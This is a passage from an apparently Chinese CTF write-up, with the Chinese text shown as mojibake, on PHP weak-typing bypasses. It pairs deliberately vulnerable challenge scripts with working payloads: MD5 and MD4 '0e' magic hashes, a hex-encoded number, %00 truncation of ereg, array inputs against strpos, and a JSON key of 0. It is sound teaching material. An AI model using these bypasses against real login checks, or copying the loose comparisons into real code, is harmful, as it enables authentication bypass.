alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åŸç†ï¼š</p><blockquote><p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œ</p><p>æ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚</p></blockquote><p>ä»¥ä¸‹å­—ç¬¦ä¸²ï¼Œmd5å“ˆå¸Œå€¼éƒ½æ˜¯0eå¼€å¤´çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c">QNKCDZO<br><span class="hljs-number">0e830400451993494058024219903391</span><br><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br><br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br><br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br><br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br><br>s1885207154a<br><span class="hljs-number">0e509367213418206700842008763514</span><br><br>s1502113478a<br><span class="hljs-number">0e861580163291561247404381396064</span><br><br>s1885207154a<br><span class="hljs-number">0e509367213418206700842008763514</span><br><br>s1836677006a<br><span class="hljs-number">0e481036490867661113260034900752</span><br><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br><br>s1184209335a<br><span class="hljs-number">0e072485820392773389523109082030</span><br><br>s1665632922a<br><span class="hljs-number">0e731198061491163073197128363787</span><br><br>s1502113478a<br><span class="hljs-number">0e861580163291561247404381396064</span><br><br>s1836677006a<br><span class="hljs-number">0e481036490867661113260034900752</span><br><br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br><br>s1502113478a<br><span class="hljs-number">0e861580163291561247404381396064</span><br><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br><br>s1665632922a<br><span class="hljs-number">0e731198061491163073197128363787</span><br><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br><br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br><br>s1836677006a<br><span class="hljs-number">0e481036490867661113260034900752</span><br><br>s1885207154a<br><span class="hljs-number">0e509367213418206700842008763514</span><br><br>s532378020a<br><span class="hljs-number">0e220463095855511507588041205815</span><br><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br><br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br><br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br><br>s1502113478a<br><span class="hljs-number">0e861580163291561247404381396064</span><br><br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br><br>s1665632922a<br><span class="hljs-number">0e731198061491163073197128363787</span><br><br>s1885207154a<br><span class="hljs-number">0e509367213418206700842008763514</span><br><br>s1836677006a<br><span class="hljs-number">0e481036490867661113260034900752</span><br><br>s1665632922a<br><span class="hljs-number">0e731198061491163073197128363787</span><br><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br></code></pre></td></tr></table></figure><h2 id="9-åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"><a href="#9-åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ" class="headerlink" title="9. åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"></a>9. åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ</h2><p><a href="http://123.206.87.240:9009/20.php">http://123.206.87.240:9009/20.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-function">function <span class="hljs-title">noother_says_correct</span><span class="hljs-params">($temp)</span> </span>&#123;<br>$flag = &#x27;flag&#123;test&#125;&#x27;;<br>$one = ord(<span class="hljs-string">&#x27;1&#x27;</span>);<br><span class="hljs-comment">//ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span><br>$nine = ord(<span class="hljs-string">&#x27;9&#x27;</span>);<br><span class="hljs-comment">//ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span><br>$number = &#x27;3735929054&#x27;;<br><span class="hljs-comment">// Check all the input characters!</span><br><span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-built_in">strlen</span>($number); $i++) &#123;<br><span class="hljs-comment">// Disallow all the digits!</span><br>$digit = ord($temp &#123;$i&#125;);<br><span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123;<br><span class="hljs-comment">// Aha, digit not allowed!</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flase&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>($number == $temp)<br><span class="hljs-keyword">return</span> $flag;<br>&#125;<br>$temp = $_GET[&#x27;password&#x27;];<br><span class="hljs-function">echo <span class="hljs-title">noother_says_correct</span><span class="hljs-params">($temp)</span></span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p>å‚æ•°ä¸èƒ½æœ‰1-9çš„æ•°å­—ï¼ŒåŒæ—¶è¦æ±‚è¯¥å‚æ•°å€¼ä¸º3735929054ï¼Œæ‰€ä»¥æŠŠå€¼è½¬æ¢æˆåå…­è¿›åˆ¶ä¼ å‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Payload: ?password=<span class="hljs-number">0xdeadc0de</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201102122943381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="10-eregæ­£åˆ™-00æˆªæ–­"><a href="#10-eregæ­£åˆ™-00æˆªæ–­" class="headerlink" title="10. eregæ­£åˆ™%00æˆªæ–­"></a>10. eregæ­£åˆ™%00æˆªæ–­</h2><p><a href="http://123.206.87.240:9009/5.php">http://123.206.87.240:9009/5.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br>$flag = <span class="hljs-string">&quot;xxx&quot;</span>;<br>if (isset ($_GET[&#x27;password&#x27;])) &#123;<br>if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) &#123;<br>echo &#x27;You password must be alphanumeric&#x27;;<br>&#125; else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999) &#123;<br>if (strpos ($_GET[&#x27;password&#x27;], &#x27;-&#x27;) !== FALSE) //strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½® &#123;<br>die(&#x27;Flag: &#x27; . $flag);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>echo(&#x27;have not been found&#x27;);<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>echo &#x27;Invalid password&#x27;;<br>&#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>ä¼ å…¥çš„å€¼å¿…é¡»æ˜¯æ•°å­—æˆ–å¤§å°å†™å­—ç¬¦ï¼Œé•¿åº¦å°äº8ä¸”å¤§äº9999999,ä¸”åŒ¹é…åˆ°â€<em>-</em>â€œæ‰èƒ½è¾“å‡ºflagã€‚</p><p>å¯ä»¥ä½¿ç”¨<code>%00</code>æ¥æˆªæ–­ï¼Œå½“eregå‡½æ•°è¯»åˆ° <code>%00</code>çš„æ—¶å€™ï¼Œå°±æˆªæ­¢äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">1e8</span>%<span class="hljs-number">00</span>*-*<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201102124459121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="11-strposæ•°ç»„ç»•è¿‡"><a href="#11-strposæ•°ç»„ç»•è¿‡" class="headerlink" title="11. strposæ•°ç»„ç»•è¿‡"></a>11. strposæ•°ç»„ç»•è¿‡</h2><p><a href="http://123.206.87.240:9009/15.php">http://123.206.87.240:9009/15.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br>$flag = <span class="hljs-string">&quot;flag&quot;</span>;<br>if (isset ($_GET[&#x27;ctf&#x27;])) &#123;<br>if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;ctf&#x27;]) === FALSE)<br>     echo &#x27;å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ&#x27;; <br>else if (strpos ($_GET[&#x27;ctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE)<br>     die(&#x27;Flag: &#x27;.$flag); <br><span class="hljs-keyword">else</span><br>     echo &#x27;éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~&#x27;;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>è¦æ±‚ä¼ å…¥çš„å‚æ•°ä¸ºæ•°å­—å¹¶ä¸”åŒ…å«å­—ç¬¦ä¸²â€œ#biubiubiuâ€ï¼Œæœ‰ç‚¹éš¾æã€‚</p><p>å¯ä»¥é€šè¿‡æ•°ç»„ç»•è¿‡<code>strpos</code>ä¸<code>ereg</code>å‡½æ•°ï¼Œé‡åˆ°æ•°ç»„è¿”å›NULLï¼Œæ•°å€¼å’Œç±»å‹ç›¸åŒã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Payload: ?ctf[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201102125444628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="12-æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡"><a href="#12-æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡" class="headerlink" title="12. æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡"></a>12. æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡</h2><p><a href="http://123.206.87.240:9009/21.php">http://123.206.87.240:9009/21.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br>error_reporting(<span class="hljs-number">0</span>);<br>$flag = &#x27;flag&#123;test&#125;&#x27;;<br>if (&quot;POST&quot; == $_SERVER[&#x27;REQUEST_METHOD&#x27;]) &#123;<br>$password = $_POST[&#x27;password&#x27;];<br>if (0 &gt;= preg_match(&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;, $password)) //preg_match â€” æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é… &#123;<br>echo &#x27;flag&#x27;;<br><span class="hljs-built_in">exit</span>;<br>&#125;<br><span class="hljs-keyword">while</span> (TRUE) &#123;<br>$reg = &#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; preg_match_all($reg, $password, $arr))<br><span class="hljs-keyword">break</span>;<br>$c = <span class="hljs-number">0</span>;<br>$ps = array(&#x27;punct&#x27;, &#x27;digit&#x27;, &#x27;upper&#x27;, &#x27;lower&#x27;);<br><span class="hljs-comment">//[[:punct:]] ä»»ä½•æ ‡ç‚¹ç¬¦å· [[:digit:]] ä»»ä½•æ•°å­— [[:upper:]] ä»»ä½•å¤§å†™å­—æ¯ [[:lower:]] ä»»ä½•å°å†™å­—æ¯</span><br>foreach ($ps as $pt) &#123;<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/[[:$pt:]]+/&quot;</span>, $password))<br>$c += <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">if</span> ($c &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;<br><span class="hljs-comment">//&gt;=3ï¼Œå¿…é¡»åŒ…å«å››ç§ç±»å‹ä¸‰ç§ä¸ä¸‰ç§ä»¥ä¸Š</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;42&quot;</span> == $password) <br>              echo $flag; <br>        <span class="hljs-keyword">else</span> <br>              echo &#x27;Wrong password&#x27;;<br><span class="hljs-built_in">exit</span>;<br>&#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>ä»£ç ä¸­æ¶‰åŠåˆ°çš„ä¸€äº›æ­£åˆ™å‡½æ•°</p><table><thead><tr><th>æ­£åˆ™åŒ¹é…å‡½æ•°</th><th>æè¿°</th><th>åŒºåˆ«</th></tr></thead><tbody><tr><td>preg_match</td><td>æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼ŒåŒ¹é…åˆ°åˆ™è¿”å›1ï¼ŒåŒ¹é…ä¸åˆ°åˆ™è¿”å›0</td><td>ç¬¬ä¸€æ¬¡åŒ¹é…æˆåŠŸåå°±åœæ­¢åŒ¹é…</td></tr><tr><td>preg_match_all</td><td>æ‰§è¡Œä¸€ä¸ªå…¨å±€æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œè¿”å›æˆåŠŸæ¨¡å¼åŒ¹é…çš„æ¬¡æ•°ï¼Œå¹¶å°†åŒ¹é…ç»“æœå­˜å‚¨åˆ°ä¸€ä¸ªæ•°ç»„ä¸­</td><td>åŒ¹é…åˆ°å­—ç¬¦ä¸²ç»“æŸä¸ºæ­¢</td></tr></tbody></table><p>ä¸‹é¢è¿˜æœ‰å‡ ä¸ªæ­£åˆ™åŒ¹é…çš„å­—ç¬¦ï¼š</p><table><thead><tr><th>æ­£åˆ™åŒ¹é…å­—ç¬¦</th><th>æè¿°</th><th>ASCII</th></tr></thead><tbody><tr><td>[:graph:]</td><td>é™¤ç©ºæ ¼ï¼ŒTABå¤–çš„æ‰€æœ‰å­—ç¬¦</td><td>[\x21-\x7E]</td></tr><tr><td>[a-zA-Z0-9]</td><td>å¤§å°å†™å­—æ¯å’Œæ•°å­—</td><td>[a-zA-Z0-9]</td></tr><tr><td>[:alpha:]</td><td>å¤§å°å†™å­—æ¯</td><td>[a-zA-Z]</td></tr><tr><td>[:punct:]</td><td>ä»»ä½•æ ‡ç‚¹ç¬¦å·</td><td>[!â€#$%&amp;â€™()*+,-./:;&lt;=&gt;?@[]^_`{} ~]</td></tr><tr><td>[:digit:]</td><td>ä»»ä½•æ•°å­—</td><td>[0-9]</td></tr><tr><td>[:upper:]</td><td>ä»»ä½•å¤§å†™å­—æ¯</td><td>[A-Z]</td></tr><tr><td>[:lower:]</td><td>ä»»ä½•å°å†™å­—æ¯</td><td>[a-z]</td></tr></tbody></table><p>ä»£ç å®¡è®¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">è¯·æ±‚æ–¹æ³•å¿…é¡»ä¸ºPOST<br><span class="hljs-number">1</span>ã€æ­£åˆ™åŒ¹é…ï¼Œ[:graph:]ä¸ºä»»æ„å­—ç¬¦ï¼Œè¦æ±‚passwordé•¿åº¦è¶…è¿‡<span class="hljs-number">12</span><br><span class="hljs-number">2</span>ã€passwordä¸­å¿…é¡»åŒ…å«æ ‡ç‚¹ç¬¦å·ï¼Œæ•°å­—ï¼Œå¤§å†™å­—æ¯ï¼Œå°å†™å­—æ¯ï¼Œå¹¶ä¸”æ£€æµ‹æ¬¡æ•°è¦è¶…è¿‡<span class="hljs-number">6</span>æ¬¡<br><span class="hljs-number">3</span>ã€æ ‡ç‚¹ç¬¦å·ï¼Œæ•°å­—ï¼Œå¤§å†™å­—æ¯ï¼Œå°å†™å­—æ¯ï¼ŒåŒ…å«<span class="hljs-number">3</span>ç§ä»¥ä¸Šç»•è¿‡<br><span class="hljs-number">4</span>ã€å¼±ç±»å‹æ¯”è¾ƒï¼Œ42abc,å¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—<br></code></pre></td></tr></table></figure><p>æ„é€ Payloadï¼Œå±…ç„¶æç¤º<code>Wrong password</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Payload: password=42BugKuctf.a<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201103190435176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä»”ç»†çœ‹äº†ä¸€ä¸‹ä»£ç ï¼Œå˜é‡åŸæ¥æ˜¯flagï¼Œæ”¹ä¸€ä¸‹Payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Payload: flag=42BugKuctf.a<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020110318591559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é“é¢˜æœ‰ç‚¹å¥‡æ€ªï¼Œéšä¾¿postä¸€ä¸ªå€¼ä¹Ÿèƒ½å¾—åˆ°flagï¼Œå°å°è„‘è¢‹æœ‰å¤§å¤§ç–‘é—®ã€‚<br><img src="https://img-blog.csdnimg.cn/20201103185441793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="13-md4ç»•è¿‡"><a href="#13-md4ç»•è¿‡" class="headerlink" title="13.md4ç»•è¿‡"></a>13.md4ç»•è¿‡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>] != hash(<span class="hljs-string">&quot;md4&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>])) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Theshy is locked&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä¸­getè¿›æ¥çš„å‚æ•°aï¼Œä½¿<code>a=md4(a)</code>æ‰è¡Œã€‚</p><p>ç™¾åº¦ä¸€ä¸‹md4ç»•è¿‡ï¼Œå‘ç°å¯ä»¥é€šè¿‡ç§‘å­¦è®¡ç®—æ³•æ¯”è¾ƒç»•è¿‡ã€‚æ‰¾ä¸€ä¸ªå€¼æ˜¯ä¸€ä¸ªç§‘å­¦è®¡ç®—æ³•0eå¼€å¤´çš„ï¼Œå…¶md4åŠ å¯†åä¹Ÿä¸º0eå¼€å¤´ï¼Œå¼±ç±»å‹æ¯”è¾ƒç»•è¿‡ã€‚</p><table><thead><tr><th>a</th><th>md4(a)</th></tr></thead><tbody><tr><td>0e251288019</td><td>0e874956163641961271069404332409</td></tr><tr><td>0e001233333333333334557778889</td><td>0e434041524824285414215559233446</td></tr><tr><td>Payloadä¸ºï¼š</td><td></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?a=<span class="hljs-number">0e251288019</span><br>æˆ–<br>?a=<span class="hljs-number">0e001233333333333334557778889</span><br></code></pre></td></tr></table></figure><h2 id="14-jsonç»•è¿‡"><a href="#14-jsonç»•è¿‡" class="headerlink" title="14.jsonç»•è¿‡"></a>14.jsonç»•è¿‡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$message</span> = json_decode(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message&#x27;</span>]);<br>    <span class="hljs-variable">$key</span> =<span class="hljs-string">&quot;*********&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$message</span>-&gt;key == <span class="hljs-variable">$key</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;~~~~&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å…¥ä¸€ä¸ªæ•°ç»„è¿›è¡Œjsonè§£ç ï¼Œè§£ç åçš„messageä¸keyå€¼ç›¸åŒæ‰ä¼šå¾—åˆ°flagï¼Œä½¿ç”¨å¼±ç±»å‹è¿›è¡Œç»•è¿‡ï¼Œkeyè‚¯å®šæ˜¯å­—ç¬¦ä¸²ï¼Œä¸¤ä¸ªç­‰å·æ—¶ä¼šè½¬åŒ–æˆåŒä¸€ç±»å‹å†è¿›è¡Œæ¯”è¾ƒï¼Œç›´æ¥æ„é€ ä¸€ä¸ª0å°±å¯ä»¥ç›¸ç­‰äº†ï¼Œé€šè¿‡0==â€adminâ€è¿™ç§å½¢å¼ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: message=&#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="15-ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡"><a href="#15-ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡" class="headerlink" title="15.ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡"></a>15.ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 